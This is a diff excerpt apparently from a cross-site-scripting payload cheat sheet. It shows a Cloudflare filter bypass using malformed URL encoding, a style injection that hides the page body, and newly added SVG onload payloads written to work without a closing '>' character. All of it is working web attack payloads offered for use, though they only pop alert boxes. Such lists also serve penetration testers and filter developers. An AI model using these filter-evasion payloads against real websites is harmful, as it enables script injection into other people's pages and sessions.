@@ -157,3 +157,14 @@ hi"><style>body{display:none}</style>
 Bypass cloudflare with incorrect url encoding
 <script>alert()</script> blocked
 %2sscript%2ualert()%2s/script%2u -xss popup
+
+
+Without ">" (XSS)
+
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+
+<opening_tag>PAYLOAD</closing_tag>
